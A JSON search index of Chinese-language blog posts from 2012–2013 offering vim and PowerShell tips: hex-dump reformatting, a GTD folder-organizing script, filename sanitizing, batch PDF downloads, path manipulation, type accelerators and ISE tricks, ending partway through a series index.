{"posts":[{"title":"在vim里转换HEX数据的显示","text":"在做嵌入式设备开发和调试工作中，可能常常遇到以下场景，需要把： 0000:60 00 00 00 00 00 00 00 00 00 00 42 00 00 18 00 `....... ...B....:0015 0016:01 80 80 00 03 14 20 24 20 11 08 17 08 12 34 56 ...... $ .....4V:0031 0032:78 08 87 65 43 21 36 35 30 34 31 37 31 38 00 59 x..eC!65 041718.Y:0047 0048:30 30 30 30 30 30 30 30 30 30 30 31 30 30 30 30 00000000 00010000:0063 0064:30 30 30 30 49 43 41 52 44 30 30 30 30 30 30 30 0000ICAR D0000000:0079 0080:34 30 30 30 30 30 30 31 32 31 36 30 30 30 30 30 40000001 21600000:0095 0096:30 34 30 30 30 30 32 30 34 30 35 31 31 31 31 31 04000020 40511111:0111 0112:31 31 31 111 :0127 这样的文本，转换为单行，头尾部分不要，中间重复的空格也不要。如下： 60 00 00 00 00 00 00 00 00 00 00 42 00 00 18 00 01 80 80 00 03 14 20 24 20 11 08 17 08 12 34 56 78 08 87 65 43 21 36 35 30 34 31 37 31 38 00 59 30 30 30 30 30 30 30 30 30 30 30 31 30 30 30 30 30 30 30 30 49 43 41 52 44 30 30 30 30 30 30 30 34 30 30 30 30 30 30 31 32 31 36 30 30 30 30 30 30 34 30 30 30 30 32 30 34 30 35 31 31 31 31 31 31 31 31 这个可以用vim的替换来实现，命令是：:%s/\\d*:\\(\\(\\x\\|\\s\\)\\{24}\\) \\(\\(\\x\\|\\s\\)\\{24}\\).*\\n/\\1\\3/g 我们还可以为它在.vimrc中定义一个快捷键映射：map &lt;C-H&gt; :%s/\\d*:\\(\\(\\x\\\\|\\s\\)\\{24}\\) \\(\\(\\x\\\\|\\s\\)\\{24}\\).*\\n/\\1\\3/g&lt;CR&gt;这样以后按一下CTRL+H键就搞定了。","link":"/2012/04/06/2012-04-06-extract-hex-data-in-vim/"},{"title":"以GTD的思想整理目录的PowerShell脚本","text":"这是花了一个晚上写的PowerShell脚本，可以把你的目录以GTD的思想整理得井井有条。但是GTD功能已经完整并通过测试。github地址：victorwoo/Get-ThingsDone。 不了解GTD的同学请参考以下材料：[《搞定》中文版] 1、[《Get Things Done》英文版] 2 #======================================================================== # Created on: 2013-3-7 16:21 # Created by: Victor.Woo # Organization: www.vichamp.com # Filename: Get-ThingsDone.ps1 #======================================================================== function Check-Enviroment { $gtdPath = &quot;HKCU:\\Software\\Vichamp\\GTD&quot; if ((Get-ItemProperty $gtdPath -ErrorAction SilentlyContinue).AutoStart -eq &quot;False&quot;) { return } $runPath = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' $run = Get-ItemProperty $runPath if ($run.GTD -eq $null) { $title = '自动执行请求' $message = '在当前 Windows 用户登录时自动运行此脚本，可以自动帮助您整理、规划当日的工作内容。如果您选择了“是”，但将来不希望自动启动，请执行 uninstall.cmd。是否在当前用户登录时自动执行脚本？' $yes = New-Object System.Management.Automation.Host.ChoiceDescription &quot;&amp;Yes&quot;,&quot;Windows 用户登录时自动运行此脚本。&quot; $no = New-Object System.Management.Automation.Host.ChoiceDescription &quot;&amp;No&quot;,&quot;Windows 用户登录时不运行此脚本，并且不再提示。&quot; $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes,$no) $result = $Host.UI.PromptForChoice($title,$message,$options,0) switch ($result) { 0 { Set-ItemProperty -Path $runPath -Name GTD -Value $gtdCmd } 1 { md $gtdPath -Force Set-ItemProperty -Path $gtdPath -Name AutoStart -Value &quot;False&quot; } } } } function TryCreate-Directory ([Parameter(Mandatory = $True)] [string]$dirName) { $private:dir = Join-Path $baseDir $dirName if (-not (Test-Path $dir)) { Write-Output &quot;$dir 不存在，正在创建。&quot; mkdir $dir | Out-Null } } function TryCreate-Directories () { Write-Output &quot;正在检查目录完整性&quot; $dirNames | % { TryCreate-Directory $_ } } function Remove-Directories () { $dirNames | % { $private:dir = Join-Path $baseDir $_ if (Test-Path $dir) { Write-Warning &quot;正在移除$dir&quot; rm $dir -Recurse } } } function MoveTo-WithRenamming ( [Parameter(Mandatory = $True)] [System.IO.FileSystemInfo]$item, [Parameter(Mandatory = $True)] [string]$targetDir) { function Get-NextFilePath ([string]$dir,[System.IO.FileInfo]$fileInfo) { $Private:targetFilePath = Join-Path $dir $fileInfo.Name if (Test-Path $Private:targetFilePath) { $Private:index = 1 do { $Private:targetFilePath = Join-Path $dir &quot;$($fileInfo.BaseName) ($index)$($fileInfo.Extension)&quot; $Private:index++ } while (Test-Path $Private:targetFilePath) } return [System.IO.FileInfo]$Private:targetFilePath } function Get-NextDirectoryPath ([string]$dir,[System.IO.DirectoryInfo]$directoryInfo) { $Private:targetDirectoryPath = Join-Path $dir $directoryInfo.Name if (Test-Path $Private:targetDirectoryPath) { $Private:index = 1 do { $Private:targetDirectoryPath = Join-Path $dir &quot;$($directoryInfo.Name) ($index)&quot; $Private:index++ } while (Test-Path $Private:targetDirectoryPath) } return [System.IO.DirectoryInfo]$Private:targetDirectoryPath } Write-Output &quot;正在移动 $item 至 $targetDir 目录&quot; if ($item -is [System.IO.FileInfo]) { # 待移动的是文件 [System.IO.FileInfo]$item = [System.IO.FileInfo]$item $Private:targetFilePath = Join-Path $targetDir $item.Name if (Test-Path $Private:targetFilePath) { # 目标文件已存在 $targetFileInfo = [System.IO.FileInfo]$Private:targetFilePath $Private:targetFilePath = Get-NextFilePath $targetDir $item if ($item.LastWriteTime -eq $targetFileInfo.LastWriteTime -and $item.Length -eq $targetFileInfo.Length) { # 文件时间和大小相同 Write-Warning &quot;源文件 $item.FullName 与目标文件 $targetFileInfo.FullName 相同，删除源文件&quot; Remove-Item $item.FullName } else { Write-Warning &quot;目标文件已存在，自动改名为$($Private:targetFilePath.Name)&quot; Move-Item $item.FullName $Private:targetFilePath | Out-Null } } else { # 目标文件不存在 if (!(Test-Path $targetDir)) { # 目标目录不存在，创建目标目录 md $targetDir | Out-Null } Move-Item $item.FullName $Private:targetFilePath | Out-Null } } elseif ($item -is [System.IO.DirectoryInfo]) { # 待移动的是目录 [System.IO.DirectoryInfo]$item = [System.IO.DirectoryInfo]$item $Private:targetDirectoryPath = Join-Path $targetDir $item.Name if (Test-Path $Private:targetDirectoryPath) { $Private:targetDirectoryPath = Get-NextDirectoryPath $targetDir $item Write-Warning &quot;目标文件夹已存在，自动改名为$($Private:targetDirectoryPath.Name)&quot; } Move-Item $item.FullName $Private:targetDirectoryPath | Out-Null } } function Process-IsolatedItems { Write-Output &quot;正在将游离内容移至 [STUFF] 目录&quot; Get-ChildItem $baseDir -Exclude ($dirNames + $reservedDirs + $reservedFiles) | % { MoveTo-WithRenamming $_ $stuffDir } } function Process-TomorrowDir { Write-Output &quot;正在处理 [TOMORROW] 目录&quot; Get-ChildItem $tomorrowDir | % { MoveTo-WithRenamming $_ $todayDir } } function Process-CalendarDir { Write-Output &quot;正在处理 [CALENDAR] 目录&quot; Get-ChildItem $calendarDir -File | % { MoveTo-WithRenamming $_ $stuffDir } Get-ChildItem $calendarDir -Directory | % { $regex = [regex]'(?m)^(?&lt;year&gt;19|20\\d{2})[-_.](?&lt;month&gt;\\d{1,2})[-_.](?&lt;day&gt;\\d{1,2})$' $match = $regex.Match($_.Name) if ($match.Success) { $Private:year = $regex.Match($_.Name).Groups['year'].Value; $Private:month = $regex.Match($_.Name).Groups['month'].Value; $Private:day = $regex.Match($_.Name).Groups['day'].Value; $Private:date = New-Object System.DateTime $Private:year,$Private:month,$Private:day $now = (Get-Date) $today = $now.Subtract($now.TimeOfDay) if ($date -lt $today) { Write-Output &quot;移动过期任务 $($_.Name) 到 [STUFF] 目录&quot; MoveTo-WithRenamming $_ $stuffDir } elseif ($date -eq $today) { Write-Output &quot;移动今日任务 $($_.Name) 到 [TODAY] 目录&quot; MoveTo-WithRenamming $_ $todayDir } elseif ($date -eq $today.AddDays(1)) { Write-Output &quot;移动明日任务 $($_.Name) 到 [TOMORROW] 目录&quot; MoveTo-WithRenamming $_ $tomorrowDir } } else { Write-Output &quot;[CALENDAR] 目录下，$($_.Name) 名字不符合规范，将移动至 [STUFF] 目录&quot; MoveTo-WithRenamming $_ $stuffDir } } } function Process-ArchiveDir { Write-Output &quot;正在检查 [ARCHIVE] 目录&quot; # 创建本月目录 $nowString = &quot;{0:yyyy.MM}&quot; -f (Get-Date) $thisMonthDir = Join-Path $archiveDir $nowString if (-not (Test-Path $thisMonthDir)) { Write-Output &quot;正在创建本月目录&quot; md $thisMonthDir } # 移除除本月之外的空目录 Get-ChildItem $archiveDir -Exclude $nowString -Recurse | Where { $_.PSIsContainer -and @( Get-ChildItem -LiteralPath $_.FullName -Recurse | Where { !$_.PSIsContainer }).Length -eq 0 } | % { Write-Output &quot;正在删除空目录$($_.FullName)&quot; Remove-Item -Recurse } # 移动所有文件到 本月存档 目录 Get-ChildItem $archiveDir -File | % { $lastWriteTime = &quot;{0:yyyy.MM}&quot; -f $_.LastWriteTime $lastWriteDir = Join-Path $archiveDir $lastWriteTime Write-Output &quot;移动 [ARCHIVE] 目录下，$($_.Name) 游离文件至 $lastWriteDir 存档目录&quot; MoveTo-WithRenamming $_ $lastWriteDir } # 检查目录命名是否符合规范。 Get-ChildItem $archiveDir -Directory | % { $regex = [regex]'(?m)^(?&lt;year&gt;19|20\\d{2})[-_.](?&lt;month&gt;\\d{1,2})$' $match = $regex.Match($_.Name) if ($match.Success) { # Archive目录下的名字符合格式 $year = $regex.Match($_.Name).Groups['year'].Value; $month = $regex.Match($_.Name).Groups['month'].Value; $date = New-Object System.DateTime $year,$month,1 if ($date -gt (Get-Date)) { Write-Output &quot;[ARCHIVE] 目录下，$($_.Name) 名字不符合规范（存档日期超出当前时间），将移动至 [STUFF] 目录&quot; MoveTo-WithRenamming $_ $stuffDir } else { $formattedDate = &quot;{0:yyyy.MM}&quot; -f $date if ($_.Name -ne $formattedDate) { $targetDirectory = [System.IO.DirectoryInfo](Join-Path $_.Parent.FullName $formattedDate) Write-Warning &quot;将 [ARCHIVE] 下的目录名 $($_.Name) 处理为规范格式 $($targetDirectory.Name)&quot; Move-Item $_.FullName $targetDirectory.FullName } } } else { # Archive目录下的名字符不合格式 $lastWriteTime = $nowString = &quot;{0:yyyy.MM}&quot; -f $_.LastWriteTime $lastWriteDir = Join-Path $archiveDir $lastWriteTime Write-Output &quot;移动 [ARCHIVE] 目录下，$($_.Name) 游离文件夹至 $lastWriteDir 存档目录&quot; MoveTo-WithRenamming $_ $lastWriteDir } } } function Explore-Dirs { if ((Get-ChildItem $stuffDir) -ne $null) { explorer $stuffDir } if ((Get-ChildItem $todayDir) -ne $null) { explorer $todayDir } } $STUFF = &quot;1.STUFF&quot; $TODAY = &quot;2.TODAY&quot; $TOMORROW = &quot;3.TOMORROW&quot; $UPCOMING = &quot;4.UPCOMING&quot; $CALENDAR = &quot;5.CALENDAR&quot; $SOMEDAY = &quot;6.SOMEDAY&quot; $ARCHIVE = &quot;7.ARCHIVE&quot; $dirNames = $STUFF,$TODAY,$TOMORROW,$UPCOMING,$CALENDAR,$SOMEDAY,$ARCHIVE $reservedDirs = &quot;.git&quot;,&quot;_gsdata_&quot; $reservedFiles = &quot;.gitignore&quot;,&quot;Get-ThingsDone.ps1&quot;,&quot;README*.md&quot;,&quot;gtd_logo.png&quot;,&quot;LICENSE.md&quot;,&quot;GTD.cmd&quot;,&quot;uninstall.cmd&quot; $baseDir = Split-Path $MyInvocation.MyCommand.Path $stuffDir = Join-Path $baseDir $STUFF $todayDir = Join-Path $baseDir $TODAY $tomorrowDir = Join-Path $baseDir $TOMORROW $calendarDir = Join-Path $baseDir $CALENDAR $archiveDir = Join-Path $baseDir $ARCHIVE $gtdCmd = Join-Path $baseDir &quot;GTD.cmd&quot; Get-Date | Write-Output Check-Enviroment TryCreate-Directories Process-IsolatedItems Process-TomorrowDir Process-CalendarDir Process-ArchiveDir Explore-Dirs ######################### 开发临时用（在 ISE 中选中并按 F8 执行） ######################### return { return # 创建游离内容。 $null | Set-Content (Join-Path $baseDir &quot;to.del.file.txt&quot;) md (Join-Path $baseDir &quot;to.del.dir&quot;) | Out-Null } { return # 对代码排版。 Import-Module D:\\Dropbox\\script\\DTW.PS.PrettyPrinterV1\\DTW.PS.PrettyPrinterV1.psd1 Edit-DTWCleanScript D:\\Dropbox\\vichamp\\GTD\\Get-ThingsDone.ps1 } { return # 移除所有目录 Remove-Directories }","link":"/2013/03/07/2013-03-07-gtd-script/"},{"title":"新手从 0 开始学习 PowerShell 的路线","text":"以下是我个人的PowerShell学习路线，也许可以节省您一些走弯路的时间，供参考。 入门材料 微软虚拟学院 快速入门: PowerShell 3.0 - 有讲座视频、中文字幕、pdf 讲义，轻松起步。我把它们都传到百度云上了，下载地址请参见 PowerShell 微软虚拟学院课程。 Windows Powershell入门指南（中文）-微软资料.pdf - 篇幅很短，仅 29 页，入门找感觉，一天即可读完。 pstips.chm - 中文电子书，篇幅适中，涵盖了语法要点，重点推荐！ 速查表推荐打印出来放案头备用。 Windows PowerShell 语言快速参考.rtf - 只有三页纸的速查表（中文） powershell_reference_Apr2010.doc - 只有两页纸的速查表（英文） 中文手册，用于查阅 WindowsPowerShellHelp_官方手册.chm - 微软官方，浏览一下有哪些内容，日后备用。 官方网站Microsoft PowerShell 英文电子书 [Windows.PowerShell.Pocket.Reference(2nd,2012.12)].Lee.Holmes.文字版.pdf - 系统学习用，可以一周读完，后几章可跳过，100 来页。 [Windows.Powershell.实战(第2版)].(Windows.Powershell.in.Action).Bruce.Payette.文字版.pdf - 经典，深入学习用，900 来页，可以用来当工具书查阅。 邮件列表 Power Tips - 右侧有个 Tips via Email，在这儿通过电子邮件订阅，每天会发给你一封短小的邮件。一点一滴学习，内容都很精致。 电子书合集所有 PowerShell 电子书的合集，自动更新：《PowerShell 电子书合集》 个人博客 PowerShell学习资料整理 · woostundy 补充说明 文中提到的所有 pdf、chm 电子书，都可以在***PowerShell 技术交流（QQ 群号：271143343）**的群共享中找到。 pstips.chm 实际上是 PowerShell 在线教程 的离线版。 PowerShell 在线教程 实际上又是 Master-PowerShell 的中文翻译，感谢荔非苔的劳动。","link":"/2013/05/09/guide-line-to-learn-powershell/"},{"title":"批量更改csdn下载的文件名（UrlDecode)","text":"例如csdn下载的一个文件名字为 %5B大家网%5DWindows.PowerShell应用手册%5Bwww.TopSage.com%5D.pdf，我们通过两行PowerShell脚本把它转化为正常的 [大家网]Windows.PowerShell应用手册[www.TopSage.com].pdf。量大的时候特别好用。 方法如下： Add-Type -AssemblyName System.Web dir | % { ren -LiteralPath $_ ([System.Web.HttpUtility]::UrlDecode($_)) }","link":"/2013/05/07/batch-changing-csdn-download-file-name/"},{"title":"修正文件名&#x2F;目录名的PowerShell脚本","text":"计划写一系列整理文件用的脚本。例如根据id3来对mp3文件归档、根据exif信息来对照片归档、根据verycd上的资源名称对下载的文件归档……这时候会遇到一个问题：Windows的文件系统是不允许某些特殊字符，以及设备文件名的。详细的限制请参见：http://zh.wikipedia.org/wiki/%E6%AA%94%E6%A1%88%E5%90%8D%E7%A8%B1。 这个PowerShell脚本帮助你避开这些坑。具体的做法是将特殊字符替换成’.’，对于恰好是设备名称的主文件名或扩展名之前添加’_’。 function Get-ValidFileSystemName { [CmdletBinding()] param( [Parameter(Mandatory = $true, ValueFromPipeline = $true)] [string]$FileSystemName ) process{ $deviceFiles = 'CON', 'PRN', 'AUX', 'CLOCK$', 'NUL', 'COM1', 'COM2', 'COM3', 'COM4', 'COM5', 'COM6', 'COM7', 'COM8', 'COM9', 'LPT1', 'LPT2', 'LPT3', 'LPT4', 'LPT5', 'LPT6', 'LPT7', 'LPT8', 'LPT9' $fileName = [System.IO.Path]::GetFileNameWithoutExtension($FileSystemName) $extension = [System.IO.Path]::GetExtension($FileSystemName) if ($extension.StartsWith('.')) { $extension = $extension.Substring(1) } if ($deviceFiles -contains $fileName) { $fileName = &quot;_$fileName&quot; } if ($deviceFiles -contains $extension) { $extension = &quot;_$extension&quot; } if ($extension -eq '') { $FileSystemName = &quot;$fileName$extension&quot; } else { $FileSystemName = &quot;$fileName.$extension&quot; } $FileSystemName = $FileSystemName -creplace '[\\\\/|?&quot;*:&lt;&gt;\\x00\\x1F\\t\\r\\n]', '.' return $FileSystemName } }","link":"/2013/06/27/fix-file-name/"},{"title":"用脚本批量下载www.cheat-sheets.org中的所有pdf文件","text":"流水不腐，户枢不蠹。虽然批量下载有很多工具能做到，但是为了提高，我们尽量动手编写脚本吧。http://www.cheat-sheets.org 里有很多好东西，我们把它批量下载下来。 PowerShell代码： Add-Type -AssemblyName System.Web $baseUrl = 'http://www.cheat-sheets.org' $result = Invoke-WebRequest $baseUrl $result.Links | ? {$_.href -Like '*.pdf'} | select -ExpandProperty href | sort | % { if ($_ -like '/*') { $baseUrl + $_ } else { $_ } } | % { echo &quot;Downloading $_&quot; $fileName = $_.Substring($_.LastIndexOf(&quot;/&quot;) + 1) $localFileName = [System.Web.HttpUtility]::UrlDecode($fileName) if (Test-Path $localFileName) { return } Invoke-WebRequest -Uri $_ -OutFile $localFileName if (Test-Path $localFileName) { Unblock-File $localFileName } }","link":"/2013/06/08/batch-downloading-www-cheat-sheets-org/"},{"title":"用PowerShell统计关键词","text":"本来开始打算大干一场的，结果发现区区4行代码搞定了。原来用PowerShell统计关键词这么欢乐啊。 $wordBreakers = &quot;,. ()\\\\/';-&lt;&gt;_#&quot; $wordTemplate = '^Pub\\w+' cd D:\\Dropbox\\workdir\\LandiStore\\BOCISTDemo\\src\\Project $content = (dir *.c -Recurse | % { cat $_} ) -join &quot;`n&quot; $words = $content.Split($wordBreakers) $words = $words | ? {$_ -Match $wordTemplate} #$words | sort -Unique $words | group | sort count -Descending | select Name, Count","link":"/2013/06/28/using-powershell-to-count-words/"},{"title":"定时休眠的命令","text":"例如2个小时以后休眠： timeout /t 7200 /nobreak &amp; shutdown /h 注意事项： shutdown /h /t xxx 这样的组合是没用的。 注意倒计时过程中不能按 CTRL+C 组合键来中止倒计时，否则会立即休眠。正确中止倒计时的方法是直接关闭命令行窗口。","link":"/2013/08/16/scheduling-hibernate/"},{"title":"PowerShell 技能连载 - 处理文件系统路径(第1部分)","text":"PowerShell允许您存取多个数组元素。通过使用 -help 和 -join，您可以很方便地通过这种方式处理多个文件系统路径。 若要排除第二层和第三层文件夹，试试以下代码： $path = 'C:\\users\\Tobias\\Desktop\\functions.ps1' $array = $path -split '\\\\' $newpath = $array[0,3,4] $newpath -join '\\' 若要重命名第二层子文件夹，试试以下代码： $path = 'C:\\users\\Tobias\\Desktop\\functions.ps1' $array = $path -split '\\\\' $array[2] = 'OtherUser' $array -join '\\'","link":"/2013/09/04/manipulating-file-system-paths-1/"},{"title":"PowerShell 技能连载 - 处理文件系统路径(第3部分)","text":"在之前介绍的技巧中我们介绍了如何将文件系统路径转化为数组，并且通过改变或排除数组的一部分元素创建一个新的路径。您可以通过将数组转化为 ArrayList 类型来使其变得更简单。现在，您可以非常容易地删除现有的或增加新的路径元素。 这个例子将第一个层文件夹重命名，排除第二层子文件夹，并在第4层子文件夹之后增加一个子文件夹： $path = 'C:\\users\\Tobias\\Desktop\\functions.ps1' [System.Collections.ArrayList]$array = $path -split '\\\\' $array[1] = 'MyUsers' $array.RemoveAt(2) $array.Insert(3, 'NewSubFolder') $array.Insert(4, 'AnotherNewSubFolder') $array -join '\\' 结果路径是： C:\\MyUsers\\Desktop\\NewSubFolder\\AnotherNewSubFolder\\functions.ps1","link":"/2013/09/06/manipulating-file-system-paths-3/"},{"title":"PowerShell 技能连载 - 处理文件系统路径(第2部分)","text":"当您将一个路径转换为数组来操作路径的各个部分时，如果您希望通过固定的数组下标来存取路径的部分，则该方法仅限于子文件夹的数量是固定的情况。 若要操作路径长度不固定的情况，试着利用变量。这个例子将会去除第1层和第2层子文件夹，无论路径有多长： $path = 'C:\\users\\Tobias\\Desktop\\functions.ps1' $array = $path -split '\\\\' $length = $array.Count $newpath = $array[,0+3..$length] $newpath -join '\\' 请注意提取新路径的数组元素的方法： $newpath = $array[,0+3..$length] 这行代码取出第1个路径元素（下标为0）和第4个元素以及其之后的所有元素（下标从3开始）。 此处的奥秘是PowerShell支持多个数组下标。表达式 x..y 创建一个范围为x到y的数字型数组，其中x和/或y可以是变量。 当您需要增加单独的下标时，您必须将它们转化为数组，因为只有数组能被添加到数组中。这是为什么代码中下标0写成 ,0 的原因。这样写是为了创建一个只包含0的数组，并且这个数组可以被添加到数字范围的数组，并返回一个包含所有你需要的下标的数组。","link":"/2013/09/05/manipulating-file-system-paths-2/"},{"title":"PowerShell 技能连载 - 多个返回值","text":"一个PowerShell函数可以有多个返回值。要接收这些返回值，只需要将返回值赋给多个变量： function Get-DateTimeInfo { # Value 1 Get-Date -Format 'dddd' # Value 2 Get-Date -Format 'MMMM' # Value 3 Get-Date -Format 'HH:mm:ss' } $day, $month, $time = Get-DateTimeInfo &quot;Today is $day, the month is $month, and it is $time&quot;","link":"/2013/09/09/returning-multiple-values/"},{"title":"PowerShell 技能连载 - 查找类型加速器","text":"PowerShell维护着一系列.NET类型的缩写，使您编写代码更加自如。例如要将一个字符串转换成DateTime类型，您可以这样写： [DateTime] '2013-07-02' 它的幕后机制只是一个名为 System.DateTime 类型的缩写。您可以通过 FullName 属性查看这些缩写实际上代表的类型： [DateTime].FullName 若要获取所有支持的“类型加速器”（缩写），您可以使用以下代码。这段代码返回PowerShell实现的所有加速器。这段代码十分有用，因为它列出了PowerShell开发者认为十分重要的所有.NET内部类型。 [PSObject].Assembly.GetType(&quot;System.Management.Automation.TypeAccelerators&quot;)::Get | Sort-Object -Property Value 当您将结果通过管道输出到一个grid view窗口时，您可以方便地搜索类型加速器。只需要在grid view窗口顶部的搜索框内键入类型名的一部分即可： [PSObject].Assembly.GetType(&quot;System.Management.Automation.TypeAccelerators&quot;)::Get | Sort-Object -Property Value | Out-GridView","link":"/2013/09/10/finding-type-accelerators/"},{"title":"PowerShell 技能连载 - 增加新的类型加速器","text":"如果您发现您常常使用某些.NET类型，您可能会希望创建一些快捷方式，使您的生活变得更简单。 例如，System.IO.Path .NET类型有许多常用的路径功能： [System.IO.Path]::GetExtension('c:\\test.txt') [System.IO.Path]::ChangeExtension('c:\\test.txt', 'bak') 如果您觉得每次为了这个.NET类型敲入长长的代码太辛苦，只需要用这种方式增加一个快捷方式： [PSObject].Assembly.GetType(&quot;System.Management.Automation.TypeAccelerators&quot;)::Add('Path', [System.IO.Path]) 现在，您可以通过 Path 快捷方式获得完全一样的功能： [Path]::GetExtension('c:\\test.txt') [Path]::ChangeExtension('c:\\test.txt', 'bak') 要查看一个类型所支持的所有方法和属性，用以下的代码： [Path] | Get-Member -Static","link":"/2013/09/11/adding-new-type-accelerators-in-powershell/"},{"title":"PowerShell 技能连载 - 通过F12键跳转到函数定义","text":"如果您将要编写又长又复杂，有很多函数的PowerShell代码，那么这篇文章对您有所帮助。在其它开发环境中，当您将光标停在一个函数上，并按下F12键，编辑器将跳转到函数的定义处。而PowerShell ISE并不会那么做。 然而，您可以为ISE增加这个功能。以下代码将在 AddOns 菜单处增加一个新的 Find Definition 命令，并且为其绑定键盘的 F12 热键。 下一次您在一大段脚本中点击某个函数，ISE将直接导航到该函数的定义处（当函数在脚本内定义时）。 function Find-Definition { $e = $psISE.CurrentFile.Editor $Column = $e.CaretColumn $Line = $e.CaretLine $AST = [Management.Automation.Language.Parser]::ParseInput($e.Text,[ref]$null,[ref]$null) $AST.Find({param($ast) ($ast -is [System.Management.Automation.Language.CommandAst]) -and (($ast.Extent.StartLineNumber -lt $Line -and $ast.Extent.EndLineNumber -gt $line) -or ($ast.Extent.StartLineNumber -eq $Line -and $ast.Extent.StartColumnNumber -le $Column) -or ($ast.Extent.EndLineNumber -eq $Line -and $ast.Extent.EndColumnNumber -ge $Column))}, $true) | Select-Object -ExpandProperty CommandElements | ForEach-Object { $name = $_.Value $AST.Find({param($ast) ($ast -is [System.Management.Automation.Language.FunctionDefinitionAst]) -and ($ast.Name -eq $name)}, $true) | Select-Object -Last 1 | ForEach-Object { $e.SetCaretPosition($_.Extent.StartLineNumber,$_.Extent.StartColumnNumber) } } } $psISE.CurrentPowerShellTab.AddOnsMenu.Submenus.Add(&quot;Goto Definition&quot;,{Find-Definition},'F12')","link":"/2013/09/12/go-to-function-definition-on-f12/"},{"title":"PowerShell 技能连载 - 竖排的网格视图","text":"效果图： 您总是可以将多个对象通过管道输出到 Out-GridView 并且得到一个美观的窗口，窗口中含有一个表格，表格中的每一行对应对象所有属性。当您需要显示很多对象的时候这种做法十分有效。 如果您只是希望显示单个对象的所有属性，那么显示为一个竖排的表格则更为美观。实际上您可以通过名为 PropertyGrid 的控件来实现。以下是相应的方法： Function Show-Object { param ( [Parameter(Mandatory=$true,ValueFromPipeline=$true)] [Object] $InputObject, $Title ) Add-Type -AssemblyName system.Windows.Forms Add-Type -AssemblyName system.Drawing if (!$Title) { $Title = &quot;$InputObject&quot; } $Form = New-Object &quot;System.Windows.Forms.Form&quot; $Form.Size = New-Object System.Drawing.Size @(600,600) $PropertyGrid = New-Object System.Windows.Forms.PropertyGrid $PropertyGrid.Dock = [System.Windows.Forms.DockStyle]::Fill $Form.Text = $Title $PropertyGrid.SelectedObject = $InputObject $PropertyGrid.PropertySort = 'Alphabetical' $Form.Controls.Add($PropertyGrid) $Form.TopMost = $true $null = $Form.ShowDialog() } 现在，您可以将任何对象通过管道输出至 Show-Object，它将显示一个竖排的属性网格（PropertyGrid）。更有趣的是，所有可写的对象都被加粗，并且您的的确确可以在网格中修改这些值（注意，改变值有可能很危险）。并且许多对象，当您选择一个属性，将在状态条上显示详细的描述信息： Get-Process -id $pid | Show-Object $host | Show-Object Get-Item -Path $pshome\\powershell.exe | Show-Object","link":"/2013/09/13/vertical-grid-view/"},{"title":"PowerShell 技能连载 - 3个最有用的ISE技巧","text":"如果您在使用PowerShell 3.0和ISE编辑器，那么您必须知道以下3个最有用的技巧： 按 CTRL+J 打开一系列包含 loops、conditions、functions 以及 workflows 等内置代码片段的清单。这个技巧可以帮助您快速起步。 当您选取一段代码后，按下 F8 将执行选中部分的代码。这个技巧在被注释的区域里也可以使用。所以您可以用 &lt;# 和 #&gt; 将一些代码注释掉，当需要执行的时候，选中它们并按下 F8 键。 若要获得cmdlet的上下文帮助，点击脚本中的cmdlet并按 F1 键。","link":"/2013/09/16/three-most-useful-ise-tricks/"},{"title":"PowerShell 技能连载 - 将Out-GridView改造为选择对话框","text":"在PowerShell 3.0中，Out-GridView 终于可以被改为一个多功能选择对话框——只要增加一个新的参数 -PassThru 就可以看到效果： $Title = 'Select one or more files to open' Get-ChildItem -Path $env:windir -Filter *.log | Out-GridView -PassThru -Title $title | ForEach-Object { notepad $_.FullName } 您可以通过管道将任何对象传给 Out-GridView。用户可以从界面中选择输出结果的一部分，或者用关键词过滤结果，然后选择结果的一个或多个元素。点击 OK 之后，选中的元素将传输到下一个命令。","link":"/2013/09/17/turn-out-gridview-into-selection-dialog/"},{"title":"PowerShell 技能连载 - 汇总索引","text":"2013 年2013 年 09 月 2013-09-04 处理文件系统路径(第1部分) 2013-09-05 处理文件系统路径(第2部分) 2013-09-06 处理文件系统路径(第3部分) 2013-09-09 多个返回值 2013-09-10 查找类型加速器 2013-09-11 增加新的类型加速器 2013-09-12 通过F12键跳转到函数定义 2013-09-13 竖排的网格视图 2013-09-16 3个最有用的ISE技巧 2013-09-17 将Out-GridView改造为选择对话框 2013-09-18 将结果复制到剪贴板 2013-09-19 PowerShell函数的详细输出 2013-09-20 在文件管理器中显示隐藏文件 2013-09-23 创建硬连接 2013-09-24 检查管理员权限 2013-09-25 创建符号链接 2013-09-26 检测显示器亮度 2013-09-27 设置显示器亮度 2013-09-30 通过关键词查找脚本 2013 年 10 月 2013-10-01 通过CSV创建对象 2013-10-02 查找所有用户脚本 2013-10-03 将Excel导出的CSV转换为UTF-8编码 2013-10-04 检查磁盘分区和数据块大小 2013-10-08 密码混淆器脚本 2013-10-09 发生了什么？ 2013-10-10 创建日历（和日期列表） 2013-10-11 从ISE编辑器中粘贴 PowerShell 代码 2013-10-14 查找 Cmdlet 2013-10-15 在 ISE 中重设 PowerShell 宿主 2013-10-16 查找 Active Directory 用户账号 2013-10-17 获取 Active Directory 账户信息 2013-10-18 查找当前的脚本文件夹 2013-10-21 将二进制 SID 转换为 SID 字符串 2013-10-22 从 DN 中获得 Domain 2013-10-23 在不同的 Domain 中查找 2013-10-24 通过 SID 查找 Active Directory 账户 2013-10-25 快速查找 Active Directory 用户账户 2013-10-28 在智能感知中隐藏参数 2013-10-29 获取 1000 个以上 Active Directory 结果 2013-10-30 在 PowerShell 中查找服务 2013-10-31 怪异的文本格式化（以及解决方法） 2013 年 11 月 2013-11-01 替换文本中的指定字符 2013-11-04 PowerShell 4.0 中的动态参数 2013-11-05 PowerShell 4.0 中的动态方法 2013-11-06 查找缺省的 Outlook 配置文件 2013-11-07 将单词首字母转换为大写 2013-11-08 导出和导入 PowerShell 历史 2013-11-11 自动找借口的脚本 2013-11-12 查找缺少邮箱地址的 Active Directory 用户 2013-11-13 键盘技巧 2013-11-14 按 F1 跳转到 PowerShell 帮助主题 2013-11-15 监测日志文件 2013-11-18 以不同用户运行 PowerShell 2013-11-20 安装 Windows Server 2012 桌面体验 2013-11-21 自动加载 Module 2013-11-22 改进版的自动加载 Module 2013-11-25 列出“真实”的硬盘 2013-11-26 获取 WMI 智能感知信息 2013-11-27 访问终极 PowerShell 生存指南 2013-11-28 加速多个 WMI 查询 2013-11-29 在 ISE 中快速选中结果 2013 年 12 月 2013-12-02 访问所有用户的桌面 2013-12-03 远程执行代码 2013-12-04 获取 DLL 文件版本信息 2013-12-05 查找已知的 USB 驱动器 2013-12-06 